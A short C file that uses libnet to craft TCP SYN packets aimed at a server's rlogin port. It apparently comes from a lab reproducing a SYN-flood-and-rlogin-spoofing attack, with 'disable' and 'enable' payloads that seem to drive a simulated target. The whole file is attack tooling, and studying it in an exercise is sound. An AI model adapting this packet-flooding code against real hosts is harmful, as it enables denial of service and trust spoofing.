#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <libnet.h>

#include "packet.h"

void flood_server(libnet_t *context) {
    int i;
    for (i = 0; i < 10; ++i) {
        send_packet_payload(
            context,
            libnet_get_prand(LIBNET_PRu32), libnet_get_prand(LIBNET_PRu32), TH_SYN,
            get_server_ip_addr(context), (u_int16_t) atoi(RLOGIN_PORT),
            get_ip_addr(context, MY_IP), (u_int16_t) libnet_get_prand(LIBNET_PRu16),
            "disable", 7
        );

        usleep(100);
    }
}

void unflood_server(libnet_t *context) {
    send_packet_payload(
        context,
        libnet_get_prand(LIBNET_PRu32), libnet_get_prand(LIBNET_PRu32), TH_SYN,
        get_server_ip_addr(context), (u_int16_t) atoi(RLOGIN_PORT),
        get_ip_addr(context, MY_IP), (u_int16_t) libnet_get_prand(LIBNET_PRu16),
        "enable", 6
    );
}